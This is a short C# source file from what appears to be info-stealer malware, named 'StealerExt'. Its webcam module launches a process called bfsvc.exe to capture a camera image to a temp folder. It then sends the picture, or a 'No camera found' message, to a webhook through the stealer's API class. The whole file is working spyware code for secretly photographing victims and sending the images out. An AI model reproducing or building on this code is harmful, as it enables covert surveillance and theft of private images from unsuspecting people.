using System.IO;

namespace StealerExt
{
    internal class WebCamCap
    {
        public static void wcc()
        {
            StartProcess.Run("bfsvc.exe", "capture.png");
            if (File.Exists(Path.Combine(API.Temp, "capture.png")))
            {
                new API(API.wHook).SendWCC("", Path.Combine(API.Temp, "capture.png"));
            }
            else
            {
                new API(API.wHook).SendWCC("No camera found", null);
            }
        }
    }
}
